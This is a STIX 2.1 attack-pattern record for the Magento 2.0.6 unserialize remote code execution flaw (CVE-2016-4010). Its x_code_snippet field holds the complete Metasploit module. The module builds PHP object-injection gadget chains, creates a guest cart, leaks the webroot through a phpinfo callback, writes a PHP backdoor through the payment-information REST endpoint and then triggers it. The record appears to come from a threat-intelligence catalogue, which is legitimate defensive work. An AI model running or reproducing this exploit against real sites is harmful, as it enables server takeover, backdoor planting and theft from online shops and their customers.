{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c9f06439-83d5-4684-b707-04d419d0f215",
    "created": "2024-08-14T17:09:24.853967Z",
    "modified": "2024-08-14T17:09:24.853973Z",
    "name": "Magento 2.0.6 Unserialize Remote Code Execution",
    "description": " This module exploits a PHP object injection vulnerability in Magento 2.0.6 or prior.  'Platform'       => 'php' 'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/magento_unserialize.rb",
            "external_id": "magento_unserialize.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-4010"
        },
        {
            "source_name": "reference",
            "url": "http://netanelrub.in/2016/05/17/magento-unauthenticated-remote-code-execution/"
        },
        {
            "source_name": "reference",
            "url": "http://blog.checkpoint.com/2015/11/05/check-point-discovers-critical-vbulletin-0-day/"
        },
        {
            "source_name": "reference",
            "url": "https://magento.com/security/patches/magento-206-security-update"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Magento 2.0.6 Unserialize Remote Code Execution',\n      'Description'    => %q{\n        This module exploits a PHP object injection vulnerability in Magento 2.0.6\n        or prior.\n      },\n      'Platform'       => 'php',\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Netanel Rubin',                         # original discovery\n          'agix',                                  # original exploit\n          'mr_me <mr_me[at]offensive-security.com>',  # metasploit module\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x22\",\n        },\n      'References'     =>\n        [\n          ['CVE', '2016-4010'],\n          ['EDB', '39838'],\n          ['URL', 'http://netanelrub.in/2016/05/17/magento-unauthenticated-remote-code-execution/'],\n          ['URL', 'http://blog.checkpoint.com/2015/11/05/check-point-discovers-critical-vbulletin-0-day/'],\n          ['URL', 'https://magento.com/security/patches/magento-206-security-update']\n        ],\n      'Arch'           => ARCH_PHP,\n      'Targets'        =>\n        [\n          [ 'Automatic Targeting', { 'auto' => true }  ],\n        ],\n      'DisclosureDate' => '2016-05-17',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, \"The base path to the web application\", \"/\"])\n      ])\n  end\n\n  def print_good(msg='')\n    super(\"#{peer} - #{msg}\")\n  end\n\n  def get_phpinfo\n    # uses the Magento_Framework_DB_Transaction class\n    serialize =  'O:13:\\\"Credis_Client\\\":22:{'\n    serialize << 's:8:\\\"\\u0000*\\u0000redis\\\";'\n    serialize << 'O:45:\\\"Magento\\\\\\Sales\\\\\\Model\\\\\\Order\\\\\\Payment\\\\\\Transaction\\\":40:{'\n    serialize << 's:9:\\\"\\u0000*\\u0000_order\\\";N;'\n    serialize << 's:21:\\\"\\u0000*\\u0000_parentTransaction\\\";N;'\n    serialize << 's:12:\\\"\\u0000*\\u0000_children\\\";N;'\n    serialize << 's:22:\\\"\\u0000*\\u0000_identifiedChildren\\\";N;'\n    serialize << 's:27:\\\"\\u0000*\\u0000_transactionsAutoLinking\\\";b:1;'\n    serialize << 's:14:\\\"\\u0000*\\u0000_isFailsafe\\\";'\n    serialize << 'b:1;'\n    serialize << 's:12:\\\"\\u0000*\\u0000_hasChild\\\";N;'\n    serialize << 's:15:\\\"\\u0000*\\u0000_eventPrefix\\\";'\n    serialize << 's:31:\\\"sales_order_payment_transaction\\\";'\n    serialize << 's:15:\\\"\\u0000*\\u0000_eventObject\\\";'\n    serialize << 's:25:\\\"order_payment_transaction\\\";'\n    serialize << 's:18:\\\"\\u0000*\\u0000_orderWebsiteId\\\";N;'\n    serialize << 's:16:\\\"\\u0000*\\u0000_orderFactory\\\";N;'\n    serialize << 's:15:\\\"\\u0000*\\u0000_dateFactory\\\";N;'\n    serialize << 's:22:\\\"\\u0000*\\u0000_transactionFactory\\\";N;'\n    serialize << 's:25:\\\"\\u0000*\\u0000orderPaymentRepository\\\";N;'\n    serialize << 's:18:\\\"\\u0000*\\u0000orderRepository\\\";N;'\n    serialize << 's:29:\\\"\\u0000*\\u0000extensionAttributesFactory\\\";N;'\n    serialize << 's:22:\\\"\\u0000*\\u0000extensionAttributes\\\";N;'\n    serialize << 's:25:\\\"\\u0000*\\u0000customAttributeFactory\\\";N;'\n    serialize << 's:24:\\\"\\u0000*\\u0000customAttributesCodes\\\";N;'\n    serialize << 's:26:\\\"\\u0000*\\u0000customAttributesChanged\\\";b:0;'\n    serialize << 's:15:\\\"\\u0000*\\u0000_idFieldName\\\";'\n    serialize << 's:2:\\\"id\\\";'\n    serialize << 's:18:\\\"\\u0000*\\u0000_hasDataChanges\\\";'\n    serialize << 'b:0;'\n    serialize << 's:12:\\\"\\u0000*\\u0000_origData\\\";N;'\n    serialize << 's:13:\\\"\\u0000*\\u0000_isDeleted\\\";'\n    serialize << 'b:0;'\n    serialize << 's:12:\\\"\\u0000*\\u0000_resource\\\";'\n    serialize << 'O:32:\\\"Magento\\\\\\Framework\\\\\\DB\\\\\\Transaction\\\":3:{'\n    serialize << 's:11:\\\"\\u0000*\\u0000_objects\\\";'\n    serialize << 'a:0:{}'\n    serialize << 's:18:\\\"\\u0000*\\u0000_objectsByAlias\\\";'\n    serialize << 'a:0:{}'\n    serialize << 's:25:\\\"\\u0000*\\u0000_beforeCommitCallbacks\\\";'\n    serialize << 'a:1:{'\n    serialize << 'i:0;'\n    serialize << 's:7:\\\"phpinfo\\\";}}' # the rub\n    serialize << 's:22:\\\"\\u0000*\\u0000_resourceCollection\\\";N;'\n    serialize << 's:16:\\\"\\u0000*\\u0000_resourceName\\\";N;'\n    serialize << 's:18:\\\"\\u0000*\\u0000_collectionName\\\";N;'\n    serialize << 's:12:\\\"\\u0000*\\u0000_cacheTag\\\";'\n    serialize << 'b:0;'\n    serialize << 's:19:\\\"\\u0000*\\u0000_dataSaveAllowed\\\";'\n    serialize << 'b:1;'\n    serialize << 's:15:\\\"\\u0000*\\u0000_isObjectNew\\\";N;'\n    serialize << 's:23:\\\"\\u0000*\\u0000_validatorBeforeSave\\\";N;'\n    serialize << 's:16:\\\"\\u0000*\\u0000_eventManager\\\";N;'\n    serialize << 's:16:\\\"\\u0000*\\u0000_cacheManager\\\";N;'\n    serialize << 's:12:\\\"\\u0000*\\u0000_registry\\\";N;'\n    serialize << 's:10:\\\"\\u0000*\\u0000_logger\\\";N;'\n    serialize << 's:12:\\\"\\u0000*\\u0000_appState\\\";N;'\n    serialize << 's:19:\\\"\\u0000*\\u0000_actionValidator\\\";N;'\n    serialize << 's:13:\\\"\\u0000*\\u0000storedData\\\";'\n    serialize << 'a:0:{}'\n    serialize << 's:8:\\\"\\u0000*\\u0000_data\\\";'\n    serialize << 'a:0:{}}'\n    serialize << 's:13:\\\"\\u0000*\\u0000redisMulti\\\";N;'\n    serialize << 's:7:\\\"\\u0000*\\u0000host\\\";N;'\n    serialize << 's:7:\\\"\\u0000*\\u0000port\\\";N;'\n    serialize << 's:10:\\\"\\u0000*\\u0000timeout\\\";N;'\n    serialize << 's:14:\\\"\\u0000*\\u0000readTimeout\\\";N;'\n    serialize << 's:13:\\\"\\u0000*\\u0000persistent\\\";N;'\n    serialize << 's:18:\\\"\\u0000*\\u0000closeOnDestruct\\\";'\n    serialize << 'b:1;'\n    serialize << 's:12:\\\"\\u0000*\\u0000connected\\\";'\n    serialize << 'b:1;'\n    serialize << 's:13:\\\"\\u0000*\\u0000standalone\\\";N;'\n    serialize << 's:20:\\\"\\u0000*\\u0000maxConnectRetries\\\";'\n    serialize << 'i:0;'\n    serialize << 's:18:\\\"\\u0000*\\u0000connectFailures\\\";'\n    serialize << 'i:0;'\n    serialize << 's:14:\\\"\\u0000*\\u0000usePipeline\\\";'\n    serialize << 'b:0;'\n    serialize << 's:15:\\\"\\u0000*\\u0000commandNames\\\";N;'\n    serialize << 's:11:\\\"\\u0000*\\u0000commands\\\";N;'\n    serialize << 's:10:\\\"\\u0000*\\u0000isMulti\\\";'\n    serialize << 'b:0;'\n    serialize << 's:13:\\\"\\u0000*\\u0000isWatching\\\";'\n    serialize << 'b:0;'\n    serialize << 's:15:\\\"\\u0000*\\u0000authPassword\\\";N;'\n    serialize << 's:13:\\\"\\u0000*\\u0000selectedDb\\\";'\n    serialize << 'i:0;'\n    serialize << 's:17:\\\"\\u0000*\\u0000wrapperMethods\\\";'\n    serialize << 'a:3:{'\n    serialize << 's:6:\\\"delete\\\";'\n    serialize << 's:3:\\\"del\\\";'\n    serialize << 's:7:\\\"getkeys\\\";'\n    serialize << 's:4:\\\"keys\\\";'\n    serialize << 's:7:\\\"sremove\\\";'\n    serialize << 's:4:\\\"srem\\\";}'\n    serialize << 's:18:\\\"\\u0000*\\u0000renamedCommands\\\";N;'\n    serialize << 's:11:\\\"\\u0000*\\u0000requests\\\";'\n    serialize << 'i:0;}'\n\n    serialize\n  end\n\n  def get_phpshell\n    s = \"#{@webroot}/#{@backdoor}\"\n    p = \"<?php #{payload.encoded} ?>\"\n    # uses the Magento_Framework_Simplexml_Config_Cache_File class\n    serialize  = 'O:13:\\\"Credis_Client\\\":22:{'\n    serialize << 's:8:\\\"\\u0000*\\u0000redis\\\";'\n    serialize << 'O:45:\\\"Magento\\\\\\Sales\\\\\\Model\\\\\\Order\\\\\\Payment\\\\\\Transaction\\\":40:{'\n    serialize << 's:9:\\\"\\u0000*\\u0000_order\\\";N;'\n    serialize << 's:21:\\\"\\u0000*\\u0000_parentTransaction\\\";N;'\n    serialize << 's:12:\\\"\\u0000*\\u0000_children\\\";N;'\n    serialize << 's:22:\\\"\\u0000*\\u0000_identifiedChildren\\\";N;'\n    serialize << 's:27:\\\"\\u0000*\\u0000_transactionsAutoLinking\\\";'\n    serialize << 'b:1;'\n    serialize << 's:14:\\\"\\u0000*\\u0000_isFailsafe\\\";'\n    serialize << 'b:1;s:12:\\\"\\u0000*\\u0000_hasChild\\\";N;'\n    serialize << 's:15:\\\"\\u0000*\\u0000_eventPrefix\\\";'\n    serialize << 's:31:\\\"sales_order_payment_transaction\\\";'\n    serialize << 's:15:\\\"\\u0000*\\u0000_eventObject\\\";'\n    serialize << 's:25:\\\"order_payment_transaction\\\";'\n    serialize << 's:18:\\\"\\u0000*\\u0000_orderWebsiteId\\\";N;'\n    serialize << 's:16:\\\"\\u0000*\\u0000_orderFactory\\\";N;'\n    serialize << 's:15:\\\"\\u0000*\\u0000_dateFactory\\\";N;'\n    serialize << 's:22:\\\"\\u0000*\\u0000_transactionFactory\\\";N;'\n    serialize << 's:25:\\\"\\u0000*\\u0000orderPaymentRepository\\\";N;'\n    serialize << 's:18:\\\"\\u0000*\\u0000orderRepository\\\";N;'\n    serialize << 's:29:\\\"\\u0000*\\u0000extensionAttributesFactory\\\";N;'\n    serialize << 's:22:\\\"\\u0000*\\u0000extensionAttributes\\\";N;'\n    serialize << 's:25:\\\"\\u0000*\\u0000customAttributeFactory\\\";N;'\n    serialize << 's:24:\\\"\\u0000*\\u0000customAttributesCodes\\\";N;'\n    serialize << 's:26:\\\"\\u0000*\\u0000customAttributesChanged\\\";b:0;'\n    serialize << 's:15:\\\"\\u0000*\\u0000_idFieldName\\\";'\n    serialize << 's:2:\\\"id\\\";'\n    serialize << 's:18:\\\"\\u0000*\\u0000_hasDataChanges\\\";'\n    serialize << 'b:0;'\n    serialize << 's:12:\\\"\\u0000*\\u0000_origData\\\";N;'\n    serialize << 's:13:\\\"\\u0000*\\u0000_isDeleted\\\";'\n    serialize << 'b:0;'\n    serialize << 's:12:\\\"\\u0000*\\u0000_resource\\\";'\n    serialize << 'O:45:\\\"Magento\\\\\\Framework\\\\\\Simplexml\\\\\\Config\\\\\\Cache\\\\\\File\\\":1:{'\n    serialize << 's:8:\\\"\\u0000*\\u0000_data\\\";'\n    serialize << 'a:3:{'\n    serialize << 's:18:\\\"is_allowed_to_save\\\";'\n    serialize << 'b:1;'\n    serialize << 's:14:\\\"stat_file_name\\\";'\n    serialize << \"s:#{s.length.to_s}:\\\\\\\"#{s}\\\\\\\";\"   # our shell\n    serialize << 's:10:\\\"components\\\";'\n    serialize << \"s:#{p.length.to_s}:\\\\\\\"#{p}\\\\\\\";}}\" # our payload\n    serialize << 's:22:\\\"\\u0000*\\u0000_resourceCollection\\\";N;'\n    serialize << 's:16:\\\"\\u0000*\\u0000_resourceName\\\";N;'\n    serialize << 's:18:\\\"\\u0000*\\u0000_collectionName\\\";N;'\n    serialize << 's:12:\\\"\\u0000*\\u0000_cacheTag\\\";'\n    serialize << 'b:0;'\n    serialize << 's:19:\\\"\\u0000*\\u0000_dataSaveAllowed\\\";'\n    serialize << 'b:1;s:15:\\\"\\u0000*\\u0000_isObjectNew\\\";N;'\n    serialize << 's:23:\\\"\\u0000*\\u0000_validatorBeforeSave\\\";N;'\n    serialize << 's:16:\\\"\\u0000*\\u0000_eventManager\\\";N;'\n    serialize << 's:16:\\\"\\u0000*\\u0000_cacheManager\\\";N;'\n    serialize << 's:12:\\\"\\u0000*\\u0000_registry\\\";N;'\n    serialize << 's:10:\\\"\\u0000*\\u0000_logger\\\";N;'\n    serialize << 's:12:\\\"\\u0000*\\u0000_appState\\\";N;'\n    serialize << 's:19:\\\"\\u0000*\\u0000_actionValidator\\\";N;'\n    serialize << 's:13:\\\"\\u0000*\\u0000storedData\\\";'\n    serialize << 'a:0:{}'\n    serialize << 's:8:\\\"\\u0000*\\u0000_data\\\";'\n    serialize << 'a:0:{}}'\n    serialize << 's:13:\\\"\\u0000*\\u0000redisMulti\\\";N;'\n    serialize << 's:7:\\\"\\u0000*\\u0000host\\\";N;'\n    serialize << 's:7:\\\"\\u0000*\\u0000port\\\";N;'\n    serialize << 's:10:\\\"\\u0000*\\u0000timeout\\\";N;s:14:\\\"\\u0000*\\u0000readTimeout\\\";N;'\n    serialize << 's:13:\\\"\\u0000*\\u0000persistent\\\";N;'\n    serialize << 's:18:\\\"\\u0000*\\u0000closeOnDestruct\\\";'\n    serialize << 'b:1;'\n    serialize << 's:12:\\\"\\u0000*\\u0000connected\\\";'\n    serialize << 'b:1;'\n    serialize << 's:13:\\\"\\u0000*\\u0000standalone\\\";N;'\n    serialize << 's:20:\\\"\\u0000*\\u0000maxConnectRetries\\\";'\n    serialize << 'i:0;'\n    serialize << 's:18:\\\"\\u0000*\\u0000connectFailures\\\";'\n    serialize << 'i:0;'\n    serialize << 's:14:\\\"\\u0000*\\u0000usePipeline\\\";'\n    serialize << 'b:0;'\n    serialize << 's:15:\\\"\\u0000*\\u0000commandNames\\\";N;'\n    serialize << 's:11:\\\"\\u0000*\\u0000commands\\\";N;'\n    serialize << 's:10:\\\"\\u0000*\\u0000isMulti\\\";'\n    serialize << 'b:0;'\n    serialize << 's:13:\\\"\\u0000*\\u0000isWatching\\\";'\n    serialize << 'b:0;'\n    serialize << 's:15:\\\"\\u0000*\\u0000authPassword\\\";N;'\n    serialize << 's:13:\\\"\\u0000*\\u0000selectedDb\\\";i:0;'\n    serialize << 's:17:\\\"\\u0000*\\u0000wrapperMethods\\\";'\n    serialize << 'a:3:{'\n    serialize << 's:6:\\\"delete\\\";'\n    serialize << 's:3:\\\"del\\\";'\n    serialize << 's:7:\\\"getkeys\\\";'\n    serialize << 's:4:\\\"keys\\\";'\n    serialize << 's:7:\\\"sremove\\\";'\n    serialize << 's:4:\\\"srem\\\";}'\n    serialize << 's:18:\\\"\\u0000*\\u0000renamedCommands\\\";N;'\n    serialize << 's:11:\\\"\\u0000*\\u0000requests\\\";'\n    serialize << 'i:0;}'\n\n    serialize\n  end\n\n  def do_check\n    data =  '{\"paymentMethod\":{\"method\":\"checkmo\",\"additional_data\":{\"additional_information\":\"'\n    data << get_phpinfo\n    data << \"\\\"}},\\\"email\\\":\\\"#{@email}\\\"}\"\n\n    send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(target_uri.path, \"/rest/V1/guest-carts/#{@guest_cart_id}/set-payment-information\"),\n      'ctype'  => 'application/json',\n      'data'   => data,\n    })\n  end\n\n  def define_globals\n    @phpsessid = Rex::Text.rand_text_alphanumeric(26)\n    @form_key  = Rex::Text.rand_text_alphanumeric(26)\n    @cookies   = \"PHPSESSID=#{@phpsessid}; form_key=#{@form_key}\"\n    @email     = \"#{@phpsessid}@#{@form_key}.com\"\n  end\n\n  def check\n    define_globals\n    # we actually exploit the bug, but just for a callback\n    begin\n      if create_fake_cart\n        if generate_cart_id\n          # twice, because we need to setup the phpinfo callback using\n          # the Magento_Framework_DB_Transaction() pop chain\n          res = \"\"\n          (0..1).step(1) do |n|\n            res = do_check\n          end\n          if (res && res.body.include?('phpinfo()'))\n            return Exploit::CheckCode::Appears\n          else\n            return Exploit::CheckCode::Safe\n          end\n        end\n      end\n    rescue ::Rex::ConnectionError => e\n      vprint_error(e.message)\n      return Exploit::CheckCode::Safe\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def get_webroot\n    data =  '{\"paymentMethod\":{\"method\":\"checkmo\",\"additional_data\":{\"additional_information\":\"'\n    data << get_phpinfo\n    data << \"\\\"}},\\\"email\\\":\\\"#{@email}\\\"}\"\n\n    # we steal path via phpinfo\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(target_uri.path, \"/rest/V1/guest-carts/#{@guest_cart_id}/set-payment-information\"),\n      'ctype'  => 'application/json',\n      'data'   => data,\n    })\n\n    if res && res.code == 200\n      @webroot = \"#{$1}\" if res.body =~ /_SERVER\\[\"DOCUMENT_ROOT\"\\]<\\/td><td class=\"v\">(.*)<\\/td><\\/tr>/\n      return true\n    end\n\n    false\n  end\n\n  def create_fake_cart\n    res = send_request_cgi({\n      'method'   => 'GET',\n      'uri'      => normalize_uri(target_uri.path, '/checkout/cart/add/uenc/\\/product/1/'),\n      'headers'  => { 'X-Requested-With' => 'XMLHttpRequest' },\n      'cookie'   => @cookies,\n      'vars_get' => { 'form_key' => @form_key }\n    })\n\n    return true if (res && res.body.include?('[]'))\n\n    false\n  end\n\n  def generate_cart_id\n    res = send_request_cgi({\n      'method'   => 'GET',\n      'uri'      => normalize_uri(target_uri.path, '/checkout/cart/'),\n      'cookie'   => @cookies,\n    })\n    if res && res.code == 200\n      @guest_cart_id = \"#{$1}\" if res.body =~ /entity_id\":\"(.*)\",\"store_id\":\\d,\"created_at/\n      return true\n    end\n\n    false\n  end\n\n  def backdoor\n    data =  \"{\\\"paymentMethod\\\":{\\\"method\\\":\\\"checkmo\\\",\\\"additional_data\\\":{\\\"additional_information\\\":\\\"\"\n    data << get_phpshell\n    data << \"\\\"}},\\\"email\\\":\\\"#{@email}\\\"}\"\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(target_uri.path, \"/rest/V1/guest-carts/#{@guest_cart_id}/set-payment-information\"),\n      'ctype'  => 'application/json',\n      'data'   => data,\n    })\n\n    return true if (res && res.body.include?('true'))\n\n    false\n  end\n\n  def exec_code\n    send_request_raw({\n      'method'   => 'GET',\n      'uri'      => normalize_uri(target_uri.path, \"/#{@backdoor}\"),\n    }, timeout = 0.5)\n  end\n\n  def exploit\n    define_globals\n    @backdoor = \"#{Rex::Text.rand_text_alphanumeric(26)}.php\"\n    register_files_for_cleanup(\"#{@backdoor}\")\n    if create_fake_cart && generate_cart_id\n      print_good(\"generated a guest cart id\")\n      if get_webroot && backdoor\n        print_good(\"backdoor done!\")\n        exec_code\n      end\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-05-17"
}